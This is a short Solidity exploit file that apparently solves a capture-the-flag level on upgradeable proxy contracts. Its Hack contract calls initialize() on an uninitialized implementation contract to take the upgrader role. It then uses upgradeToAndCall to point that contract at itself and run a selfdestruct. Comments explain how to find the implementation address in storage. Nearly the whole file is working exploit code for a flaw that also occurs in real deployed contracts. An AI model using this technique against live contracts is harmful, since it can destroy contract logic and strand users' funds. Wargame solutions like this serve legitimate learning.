// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IEngine {
    // await web3.eth.getStorageAt(contract.address, '0x....') -> 0x.. = implementation address

    // note: it is padded. even if the padded 0s are removed and there is still 0 at the beginning of the address, make new level instance
    // because it will fail pwn()

    
    function upgrader() external view returns (address); // should be 0x000 before the hack target.initialize()

    // for the hack
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}


contract Hack {
    function pwn(IEngine target) external {
        target.initialize();
        target.upgradeToAndCall(address(this), abi.encodeWithSelector(this.kill.selector));
    }

    function kill() external {
        selfdestruct(payable(0)); // In testnet etherscan the result -> Contract Self Destructed, but was later reinitalized with new ByteCode
    }
}
